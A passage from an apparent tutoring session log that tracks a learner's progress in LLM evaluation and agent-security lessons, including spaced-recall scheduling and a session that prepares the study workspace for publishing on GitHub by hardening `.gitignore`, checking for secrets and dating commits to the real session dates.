  the app **resends the whole transcript** → injected text persists & compounds), **reset to 1d (due 07-25)**.
  Learner **away from computer ~2 days** — gave an on-the-go kit (finish Anthropic *Demystifying Evals* +
  Hamel *Using an LLM as a Judge*; mental recall deck now prioritizing the two resets L01+L02, plus L05/L07/L04
  which fall due while away; design-in-head = agent #1's triage output fields + where the gate sits). Secrets
  untouched (markdown-only session). **Next (on return):** (1) re-recall **L01** (the 3-column table cold) +
  **L02** (statelessness = resend → persist/compound) — both reset, due 07-25 and will have lapsed; grade &
  advance. (2) Quick re-review of anything else due. (3) Build **`practice/L07_triage-scorecard.py`** (his
  question #1, the scorecard foundation) → then his other two threads (judge+calibration, CI gate). (4) Then
  **L08 — Memory & context management** (Stateless→Memory, the one discipline column not yet built). Capstone
  scoping stays live in parallel.
- **2026-07-24 · Session 12:** **Git-hygiene rep** (learner asked whether to publish the workspace to GitHub
  to show learning over time). Framed publishing as an on-mission security exercise. **Pre-flight sweep:**
  workspace was *not* yet a repo; `.gitignore` already excluded `.env`; only `sk-ant-...` **placeholders** in
  a lesson (no real key); `.env` chmod 600. **Hardened `.gitignore`** (added `.env.*`, `*.key`, `*.pem`,
  `.claude/settings.local.json`, `.DS_Store`). **Wrote a root `README.md`** (portfolio landing page: mission,
  three disciplines, run instructions, "learning in public"). Reinforced the lesson: `.gitignore` = the
  deterministic gate; memory = the probabilistic one → make leaking *structurally* impossible, then verify once
  anyway (same discipline as watching a gate DENY). **Renamed** two convention-breaking practice files
  (`L04_gated-action V2/V3.py` → `_v2/_v3.py`). **Rebuilt history per learner request** — one dated commit per
  lesson, oldest→newest (07-14 L01 … 07-24 L07), backdated to the real session dates from this log so the
  GitHub contribution graph reflects the actual cadence; a single push shows the full timeline (educated learner:
  history carries the dates, no need for many pushes). **Standing cleanup gains a step:** every session now ends
  with `git status` to confirm `.env` never sneaks in. Learner pushes manually after eyeballing `git log`; final
  gut-check = view the repo file tree on github.com and confirm `.env` absent. Secrets untouched. **Next unchanged:**
  on return, re-recall L01+L02, then build `practice/L07_triage-scorecard.py`, then L08 (Memory).
